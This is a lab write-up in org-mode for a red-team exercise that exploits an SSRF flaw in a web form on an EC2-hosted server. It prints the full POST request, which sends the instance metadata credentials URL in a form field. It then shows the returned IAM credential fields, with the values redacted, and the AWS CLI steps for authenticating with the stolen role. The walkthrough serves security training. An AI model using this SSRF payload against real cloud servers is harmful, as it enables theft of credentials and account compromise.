@@ -1,0 +1,95 @@
+#+title: Ec2 Compromise
+#+description: As a member of Secure Corp’s red team, your task should you choose to accept it, is to exploit a vulnerable web server hosted on EC2 and gain access to sensitive information.
+
+* task
+- Analyze the web application for vulnerabilities.
+- Retrieve IAM security credentials from metadata.
+- Authenticate with AWS CLI and enumerate the environment.
+- Capture the flag – the Instance ID of the EC2 instance.
+
+[[../imgs/ec2_compromise.png]]
+
+* lab
+http://54.166.141.194/index.html
+
+- The homepage doesn’t have any obvious input fields. Let’s dig deeper.
+
+Since the objective states that we have to exploit the SSRF and this page doesn't have any input field, let’s visit other pages. In http://54.166.141.194/index.html, we’ll find a form with some input fields.
+
+The IP address http://169.254.169.254 is used in AWS to access instance metadata and user-data for an EC2 instance. This special IP address provides information about the instance, such as its IAM role, security credentials, and other metadata.
+
+* Exploiting SSRF to Access EC2 Metadata
+
+After a bit of trial & error, we’ll discover that the Company field is vulnerable to SSRF.
+
+[[../imgs/ssrf.png]]
+
+|company field | http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
+
+#+begin_src shell Request
+POST /process.php HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,pt;q=0.8
+Connection: keep-alive
+Content-Length: 503
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEsoBmmusvPTBYl6y
+Host: 54.166.141.194
+Origin: http://54.166.141.194
+Referer: http://54.166.141.194/demo.html
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+
+------WebKitFormBoundaryEsoBmmusvPTBYl6y
+Content-Disposition: form-data; name="name"
+
+sda
+------WebKitFormBoundaryEsoBmmusvPTBYl6y
+Content-Disposition: form-data; name="ip"
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role
+------WebKitFormBoundaryEsoBmmusvPTBYl6y
+Content-Disposition: form-data; name="email"
+
+dsa
+------WebKitFormBoundaryEsoBmmusvPTBYl6y
+Content-Disposition: form-data; name="organization"
+
+adsd
+------WebKitFormBoundaryEsoBmmusvPTBYl6y--
+#+end_src
+
+After performing SSRF, now we can see the metadata and user-data. Since the objective requires obtaining the IAM role, we’ll enumerate the metadata using the below query and get security credentials
+
+Outcome: This will return AccessKeyId, SecretAccessKey, and SessionToken, which can be used to authenticate with AWS CLI.
+
+#+begin_src shell  Response
+{
+  "Code" : "Success",
+  "LastUpdated" : "2026-08-17T18:50:01Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "<accesskey>",
+  "SecretAccessKey" : "<secretkey>",
+  "Token" : "<token>",
+  "Expiration" : "2026-08-18T00:50:38Z"
+}
+#+end_src
+
+* Authorizing IAM Security Credentials
+Now that we have finally obtained the security credentials i.e, AccessKeyId, SecretAccessKey, and Token, we can now authenticate with the AWS CLI & further enumerate the environment.
+
+#+begin_src shell
+export AWS_ACCESS_KEY_ID=<AWS_ACCESS_KEY_ID>
+export AWS_SECRET_ACCESS_KEY=<AWS_SECRET_ACCESS_KEY>
+export AWS_SESSION_TOKEN=<AWS_SESSION_TOKEN>
+#+end_src
+
+If authentication is successful, this will return details about the compromised IAM role. ->
+#+begin_src shell
+aws sts get-caller-identity
+
+{
+    "UserId": "<data>",
+    "Account": "<data>",
+    "Arn": "<data>"
+}
+#+end_src
